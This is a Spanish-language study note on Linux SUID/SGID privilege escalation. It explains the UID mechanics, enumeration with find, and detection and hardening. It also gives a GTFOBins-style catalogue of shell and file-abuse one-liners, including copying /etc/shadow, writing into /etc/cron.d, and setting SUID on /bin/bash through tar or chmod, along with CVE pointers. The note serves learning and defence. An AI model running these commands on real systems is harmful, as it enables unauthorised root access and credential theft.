---
aliases:
  - SUID
  - Set User ID
  - Privilegios SUID
  - SGID
tags:
  - sec/priv-esc
  - sec/linux
tipo: concepto
estado: terminado
creado: 2026-10-11
actualizado: 2026-10-11
relacionado:
  - "[[Linux Capabilities]]"
  - "[[Abuso de Permisos en Linux y LSE]]"
  - "[[Elevación de Privilegios mediante Explotación de Binarios]]"
  - "[[Detección y Explotación de Tareas Cron]]"
  - "[[Lectura de Permisos]]"
  - "[[PATH Hijacking]]"
  - "[[Abuso de Privilegios Sudoers]]"
fuente: "https://gtfobins.github.io/"
---

# Privilegios SUID (Set User ID) en Linux

Un archivo con el bit **SUID** (*Set User ID*) hace que, al ejecutarse, el proceso adquiera el **EUID del propietario del archivo** durante toda la ejecución. Si el archivo es de `root`, cualquier usuario que lo ejecute corre con **euid=0** — es la base de binarios legítimos como `passwd` (necesita escribir en `/etc/shadow`, propiedad de root) y, a la vez, la vía de escalada **más productiva** en auditorías locales: un único SUID mal configurado = root.

> [!info] Funcionamiento en una frase
> El kernel, al hacer `execve()` sobre un archivo con SUID, **no cambia el UID real**: deja que el usuario siga siendo quien es (accounting, signals) pero fija el **EUID (y el SUID guardado)** al dueño del archivo. Todas las comprobaciones `euid == 0` del programa pasan a ser ciertas. El RUID permanece como el de quien lanzó el proceso — por eso tras escalar `id` muestra `uid=1000(user) euid=0(root)`.

## Mecánica: los cuatro UIDs y qué cambia en el `execve`

| ID | Nombre | Quién lo decide | Cambia con SUID |
|---|---|---|---|
| **RUID** (`uid`) | usuario real: quién lanzó el proceso | login | **No** |
| **EUID** (`euid`) | usuario efectivo: los chequeos de permisos | login / SUID al ejecutar | **Sí → dueño del archivo** |
| **SUID** (`suid`) | UID guardado (para volver tras `seteuid`) | login / SUID | **Sí → dueño del archivo** |
| **FSUID** | UID para operaciones de FS (chequeos de archivo) | sigue al EUID | Sí (sigue al EUID) |

| Bit | Octal | Efecto al ejecutar |
|---|---|---|
| **SUID** (`u+s`) | `4000` | EUID := propietario del archivo |
| **SGID** (`g+s`) | `2000` | EGID := grupo del archivo; en scripts, `csh` hereda el grupo |
| **Sticky** (`+t`) | `1000` | en directorios: solo el dueño borra sus archivos (`/tmp`) — **no** es un bit de ejecución |

Comportamientos del kernel que deciden el juego:

1. **Shell drop**: `bash` arrancado con `euid != ruid` **restaura `uid = euid`** (pierde el privilegio) **salvo** con la opción `-p`. Por eso el clásico es `bash -p` / `sh -p` — sin `-p` la "escalada" devuelve una shell de usuario y parece fallar. Verificar con `id` (no con `whoami`).
2. **Linux ignora SUID/SGID en scripts con `#!`** (heredado de viejos races de interpretador): `chmod u+s mi_script.sh` es **inerte** en Linux. En BSD/otros puede activarse — ver la sección de races.
3. **File capabilities alternan con SUID**: ver [[Linux Capabilities]] para el modelo granular.
4. **`nosuid`** en el mount (común en `/tmp`, `/home`, unidades externas) **anula** el bit en ese FS.
5. **`no_new_privs`** (prctl, seccomp de contenedores) bloquea cualquier ganancia de privilegio por exec: SUID incluido.
6. Escritura al archivo por un proceso **sin** `CAP_FSETID` limpia los bits SUID/SGID del inode — un binario SUID "se apaga" si lo modificas.

## Enumeración: el flujo `find` completo

```bash
# 1) Todos los SUID (el comando base)
find / -perm -4000 -type f 2>/dev/null
#    find /          busca desde la raíz
#    -perm -4000     bits indicados activados (el 4 = SUID; no importan los demás)
#    -type f         solo archivos regulares (no dirs, no enlaces)
#    2>/dev/null     silencia "Permission denied" de /proc, /sys, etc.

# 2) Variantes que conviene correr siempre
find / -perm -2000 -type f 2>/dev/null                     # SGID (p. ej. crontab)
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null # ambos de una vez
find / -user root -perm -4000 -type f 2>/dev/null           # SUID propietarios root
find / -perm /u+s,g+s -type f 2>/dev/null    # GNU: forma moderna (equivale a los de arriba)
find / -writable -perm -4000 2>/dev/null                    # SUID escribible ← P1 inmediato
ls -l $(find / -perm -4000 -type f 2>/dev/null)             # permisos+dueño de un vistazo

# 3) Complementos
locate .suid 2>/dev/null; dpkg -S $(which find) 2>/dev/null # ¿es de paquete? ¿modificado?
debsums -c 2>/dev/null | grep -i suid    # Debian: integridad de binarios del SO
rpm -Va 2>/dev/null | grep '5.*\.\.\.\.' # RHEL: flags modificados
```

### Metodología de análisis (4 pasos por binario)

| Paso | Comando | Pregunta |
|---|---|---|
| 1. Identificar | `file /usr/bin/X; ls -l /usr/bin/X` | ¿ELF, script, arquitectura, dueño `root`? |
| 2. Endurecimiento | `checksec --file=/usr/bin/X` (o localmente: subir copia) | ¿NX/PIE/Canary? (si hay bug de memoria → [[Elevación de Privilegios mediante Explotación de Binarios]]) |
| 3. Versión/CVE | `X --version`; `searchsploit X <versión>` | ¿versión vulnerable? (p. ej. `pkexec < 0.120` = PwnKit) |
| 4. Abuso sin bug | buscar en **GTFOBins** por nombre → sección *SUID* | ¿permite shell/lectura/escritura arbitraria **por diseño**? |

> [!tip] GTFOBins antes que exploit
> El 80% de los SUID explotables **no tienen CVE**: abusan de lo que el binario *hace legítimamente* (ejecutar shells, leer archivos, cambiar permisos) con los privilegios heredados. Un exploit de memoria es la segunda opción.

## Catálogo GTFOBins: binarios SUID clásicos

### A) Generadores de shell

| Binario | Comando | Mecanismo |
|---|---|---|
| `bash` | `bash -p` | `-p` impide que degrade el EUID |
| `find` | `find . -exec /bin/sh -p \; -quit` | `-exec` lanza la shell con el euid del find |
| `python`/`python3` | `python3 -c 'import os; os.execl("/bin/bash","bash","-p")'` | ejecuta binario con EUID heredado |
| `perl` | `perl -e 'exec "/bin/sh";'` o `perl -e '$> = 0; exec "/bin/sh";'` | `exec` con EUID intacto |
| `ruby` | `ruby -e 'exec "/bin/sh"'` | ídem |
| `php` | `php -r "system('sh');"` | ídem |
| `awk`/`gawk` | `awk 'BEGIN {system("/bin/sh")}'` | `system()` hereda EUID |
| `vim`/`vi` | `vim -c ':!/bin/bash -p'` | `:!comando` ejecuta comandos externos con EUID |
| `less`/`more` | abrir cualquier archivo → escribir `!/bin/sh` | el paginador permite comandos shell |
| `man` | `man -P /bin/sh man` | `-P` elige el paginador → shell con EUID |
| `nmap` *(≤7.7/7.8)* | `nmap --interactive` → `!sh` | consola interactiva con shell embebida (**eliminada en versiones modernas**) |
| `env`/`time`/`nice` | `./env bash -p` | lanzadores que `exec()` sin limpiar EUID |
| `dash`/`sh` | verificar: `sh -c 'id'` | depende de si el shell degrada; comprobar con `id` |

```bash
# Receta general: si el binario SUID ejecuta/intepreta lo que le pases:
find / -perm -4000 -type f 2>/dev/null | while read b; do
  echo "== $b"; timeout 2 "$b" -c 'id' 2>/dev/null | head -1
done   # probar flags de ejecución de código (-c, -e, -eval, --script) de cada herramienta
```

### B) Lectura/escritura arbitraria de archivos (utilidades de FS con euid 0)

| Binario | Comando | Efecto |
|---|---|---|
| `cp` | `cp /etc/shadow /tmp/` · `cp /tmp/evilpasswd /etc/passwd` | **leer** cualquier archivo · **sobrescribir** `/etc/passwd` → root |
| `mv` | `mv /etc/shadow /tmp/ ; mv mi_passwd /etc/passwd` | mover/reemplazar como root |
| `tee` | `echo 'pwn * * * * root id' \| tee /etc/cron.d/pwn` | escritura arbitraria → root vía cron |
| `dd` | `dd if=/etc/shadow of=/tmp/s.img` | lectura arbitraria |
| `tar` | `tar cf /tmp/x.tar /etc/shadow` · GNU: `tar cf /dev/null x --checkpoint=1 --checkpoint-action=exec='chmod u+s /bin/bash'` | extraer archivos privados · ejecutar comando (GNU) |
| `zip` | `zip t.zip /etc/shadow -T --unzip-command="cp /etc/shadow /tmp/"` | `-T` + `--unzip-command` ejecuta comando al testear |
| `chmod` | `./chmod 4755 /bin/bash` | **crear** SUID sobre lo que quieras → root |
| `chown` | `./chown root:root /tmp/backdoor` | apropiarte/entregar archivos a root |
| `rsync`/`install` | `rsync -a evil:/…` (con rutas absolutas) | copia con control de metadatos |

> [!info] Lógica unificada
> Cualquier binario SUID que **manipule archivos** actúa como root sobre *el sistema completo*, no sobre "sus" archivos: los chequeos de permisos usan el EUID heredado. La pregunta al ver `cp`, `cat`, `mv`, `dd` con SUID no es "¿tiene CVE?" sino **"¿qué operaciones de archivo expone?"**.

### C) Binarios SUID legítimos con CVEs históricos (clase "SUID vulnerable")

| Binario | CVE representativo | Nota |
|---|---|---|
| `pkexec` | **CVE-2021-4034** (PwnKit, Qualys) | argumentos `NULL` → root; `< 0.120` |
| `sudo` | **CVE-2021-3156** (Baron Samedit) | heap overflow en modo `sudoedit -s` (ver [[Abuso de Privilegios Sudoers]]) |
| `mount`/`umount` (util-linux) | CVE-2021-3995/3996 | parsing de `/proc/self/mountinfo` |
| `ld-linux.so` (con SUID) | **CVE-2023-4911** (Looney Tunables) | overflow en `GLIBC_TUNABLES` — ver [[Secuestro de Bibliotecas Compartidas]] |
| `ntfs-3g` | CVE-2021-35269 y familia | driver FUSE SUID frecuente en labs |
| `su`/`passwd`/`newgrp` | bugs legacy | revisar versión contra `searchsploit` |

Flujo: `X --version` → `searchsploit X <ver>` → compilar exploit en local (`gcc -static`), transferir, ejecutar. La mecánica completa de explotación de binarios está en [[Elevación de Privilegios mediante Explotación de Binarios]].

## Peligros con scripts SUID (y por qué casi nunca funcionan)

```bash
chmod 4755 /home/user/script.sh
ls -l script.sh     # -rwsr-xr-x  ← parece activo…
./script.sh; id     # …pero el bit NO hizo nada
```

- **En Linux, `#!` ignora SUID/SGID**: el kernel ejecuta el *intérprete*, que arranca con los IDs del usuario. El bit es **falso positivo** — no da privilegio, y en sistemas que sí lo honran (algún BSD/Unix histórico) introduce **races**.
- **Race clásico (donde sí se honraba)**: 1) el sistema valida el script; 2) el atacante (que puede escribir el directorio) lo reemplaza por otro contenido *antes* de que el intérprete lo lea. Mitigación histórica: reabrir vía `/proc/self/fd` y prohibir scripts SUID.
- **Interpretador que carga de su PATH/cwd**: un SUID *binario* que ejecuta un intérprete o `source` de un archivo en dir escribible = carga tu código con EUID 0 (ver [[PATH Hijacking]]).
- **Hardlink a scripts/binarios SUID**: sin `fs.protected_hardlinks=1`, enlazar binarios SUID ajenos permite retenerlos tras su eliminación o forzar su lectura. Con `protected_symlinks` evitas el swap TOCTOU en `/tmp`.

## Peligros de `chown`/`chmod` (lado defensor: cómo se crean SUID por error)

| Acción peligrosa | Qué sale mal |
|---|---|
| `chmod u+s /bin/bash` "para probar" | root shell para **cualquier** usuario |
| `chmod -R u+s /opt/herramientas` en un directorio con tools | un shell/interprete dentro → privesc inmediata |
| `cp -a` / `tar -xpf` **como root** desde un árbol no confiable | el tarball lleva `./usr/bin/find` con SUID y dueño root → backdoor de un comando |
| `chown -R` / `chmod -R` sobre árboles con dirs escribibles por usuarios | **TOCTOU**: el usuario cambia un componente por symlink en medio del recorrido → el bit/dueño se aplica fuera del árbol |
| `find … -exec chmod u+s {} \;` mal construido | aplicado a `/` o a un glob amplio |
| Restaurar backups con `cp -p`/`tar --preserve` | reactiva bits SUID de versiones viejas/vulnerables |

Regla: **ningún directorio escribible por usuarios no-admin debe ser el origen de una operación recursiva con `--preserve` hecha por root**, y `chmod u+s` solo con el nombre exacto del binario aprobado.

## Detección (lado defensor)

| Señal | Cómo mirarla |
|---|---|
| Aparición de un SUID/SGID nuevo | FIM diario: `find / -perm -4000 -type f \| sort` vs baseline; AIDE/Tripwire con `suid` checks |
| Cambio de bits sobre archivo existente | `auditctl -a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -k suid_change` + filtro `a1&04000` (máscara SUID) |
| Binario SUID no perteneciente a paquete | `dpkg -V <paquete>` / `rpm -Va`; alertar si el dueño no es root |
| Ejecución de SUID inesperada | `ausearch -k suid_exec`; EDR: proceso spawn desde `/tmp`, `/home`, `/dev/shm` |
| Script con SUID en dir escribible | revisión periódica: `find / \( -perm -4000 \) -exec file {} \; \| grep -v ELF` (¡scripts SUID = error de config) |
| Bash SUID / shells SUID | alerta inmediata: `find / -perm -4000 -name '*sh*'` |

Artefactos del ataque: `/tmp`-binarios con `u+s`, `find`/`python` con SUID instalados por el atacante, entradas `chmod 4755` en shell history, archivos ELF no firmados en `/usr/local/bin` con SUID.

## Impacto

- **Root directo (shell)**: binarios generadores de shell (`find`, `bash -p`, `python`, editores, paginadores).
- **Root directo (archivo)**: `cp`/`tee`/`tar` SUID → editar `/etc/passwd`, `/etc/cron.d`, `authorized_keys`.
- **Root pasos-a-dos**: `chmod` SUID → crear tu propio SUID → shell; `chown` SUID → apropiarte de `shadow`.
- **Persistencia**: convertir cualquier binario en SUID-backdoor una vez con euid 0.
- **Info**: `dd`/`tar`/`cp` SUID → `shadow`, claves SSH, tokens → root con credenciales (vía `su`, ver [[Abuso de Permisos en Linux y LSE]]).

## Sección defensiva: endurecimiento

```bash
# 1) Inventario y retirada de lo innecesario (¡con nombre exacto, nunca en bloque!)
find / -perm -4000 -type f 2>/dev/null
chmod u-s /usr/bin/find /usr/bin/nmap /usr/bin/vim 2>/dev/null   # ejemplos: herramientas que NO necesitan SUID

# 2) Verificar integridad de los SUID de paquete
debsums -c            # Debian/Ubuntu   (rpm -Va en RHEL)
dpkg -S /usr/bin/newgrp   # ¿pertenecen a un paquete conocido? ¿los que no, por qué existen?

# 3) Imposibilitar SUID en FS de usuarios/datos
mount -o remount,nosuid /tmp /home /var/tmp
#   en fstab:  /home  ext4  defaults,nosuid,nodev,noexec  0 2

# 4) Reglas del kernel contra races y enlaces
sysctl -w fs.protected_hardlinks=1
sysctl -w fs.protected_symlinks=1
#  (persistir en /etc/sysctl.d/99-hardening.conf)

# 5) Detección continua
find / -perm -4000 -type f 2>/dev/null | sort > /root/audit/suid.baseline   # diff diario
auditctl -a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -k suid_change

# 6) Preferir siempre…
#    sudo con regla concreta (ver [[Abuso de Privilegios Sudoers]]) en vez de SUID nuevo
#    file capabilities (ver [[Linux Capabilities]]) para privilegio mínimo
```

> [!info] Menos SUID = menos superficie
> Una instalación Debian base tiene ~15-30 SUID. Cada binario SUID añadido por un paquete de terceros es una **promesa de root para todo bug que tenga**. Auditar con la misma severidad que una clave SSH: `dpkg -S` + GTFOBins cada vez que aparezca uno nuevo.

## Errores comunes

1. **`-perm -4000` vs `-perm /4000`**: con `-` exige *todos* los bits listados (aquí basta el bit 4); con `/` (GNU) exige *al menos uno*. Para `find / \( -perm -4000 -o -perm -2000 \)` se necesita el escape de paréntesis — sin `\(` el `-o` se interpreta mal y el resultado es erróneo.
2. **Olvidar `2>/dev/null`** — la salida se inunda con `Permission denied` de `/proc` y `/sys` y se pierden los hallazgos.
3. **No mirar SGID** (`-2000`): grups como `crontab`/`mail` con SGID dan acceso a spools (ver [[Grupos de Linux y Escalada de Privilegios]]).
4. **Confundir sticky bit (`1000`) con SUID** — `drwxrwxrwt` en `/tmp` **no** es una escalada; es higiene de borrado.
5. **Shell que degrada**: ejecutar `find . -exec /bin/sh \;` sin `-p` y ver `uid=1000` → concluir "no funciona". **Comprobar con `id`** y probar `sh -p`/`bash -p`.
6. **SUID en script = falso positivo en Linux** — el bit aparece en `ls -l` pero el kernel lo ignora al ejecutar.
7. **`nmap --interactive` en nmap moderno** → "unknown option"; la consola interactiva ya no existe — ir a otra entrada del catálogo.
8. **Creer que todo SUID es vulnerable** — la mayoría (`passwd`, `su`, `sudo`, `mount`) son correctos; el riesgo es (a) abuso por diseño, (b) CVE de su versión, (c) configuración errónea.
9. **Probar contra `/proc` sin filtrar**: `find / -perm -4000` toca `/proc/<pid>/root/...` y reporta binarios duplicados inexistentes en disco real.
10. **Copiar el binario para analizarlo y olvidar dónde explotar** — `checksec`/`file` se corren sobre la copia, pero el exploit apunta al binario **del sistema** con su SUID original.

## Cheatsheet

```bash
# Enumeración
find / -perm -4000 -type f 2>/dev/null                 # SUID
find / -perm -2000 -type f 2>/dev/null                 # SGID
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null
find / -writable -perm -4000 2>/dev/null               # SUID escribible ← urgente

# Análisis por binario
file /usr/bin/X ; ls -l /usr/bin/X
checksec --file=/usr/bin/X
searchsploit <herramienta> <versión>
# + GTFOBins (https://gtfobins.github.io/) → sección SUID

# Explotación (documentada; probar solo en lab)
bash -p                                             # shells
find . -exec /bin/sh -p \; -quit                    # find
python3 -c 'import os; os.execl("/bin/bash","bash","-p")'
vim -c ':!/bin/bash -p' ; less→ '!/bin/sh'
cp /etc/shadow /tmp/ ; tee /etc/cron.d/pwn          # lectura/escritura
chmod 4755 /bin/bash                                # vía chmod SUID
id                                                  # siempre verificar uid vs euid

# Defensa
chmod u-s <binario-innecesario>
mount -o remount,nosuid /tmp /home
sysctl -w fs.protected_hardlinks=1 fs.protected_symlinks=1
find / -perm -4000 -type f | sort > suid.baseline   # diff diario + FIM
auditctl -a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -k suid_change
```

## Referencias

- GTFOBins (sección SUID de cada binario): https://gtfobins.github.io/
- HackTricks — Linux SUID/SGID: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation.html
- PayloadsAllTheThings — SUID/SGID: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation
- `capabilities(7)` y `chmod(1)` (semántica de bits): https://man7.org/linux/man-pages/man1/chmod.1.html
- Notas internas: [[Elevación de Privilegios mediante Explotación de Binarios]], [[Linux Capabilities]], [[Abuso de Privilegios Sudoers]]

## Relacionadas

- [[Linux Capabilities]] — el modelo granular que reemplaza al SUID "todo o nada"
- [[Elevación de Privilegios mediante Explotación de Binarios]] — cuando el SUID tiene un bug de memoria
- [[Abuso de Permisos en Linux y LSE]] — `find -perm -4000` dentro del flujo de enumeración
- [[Abuso de Privilegios Sudoers]] — la alternativa moderna al SUID y su CVEs
- [[Detección y Explotación de Tareas Cron]] — SUID + cron como combinación de abuso
- [[PATH Hijacking]] — SUID que invoca comandos relativos
- [[Lectura de Permisos]] — lectura de `ls -l` y octales de fondo
- [[Grupos de Linux y Escalada de Privilegios]] — el bit SGID y sus grupos
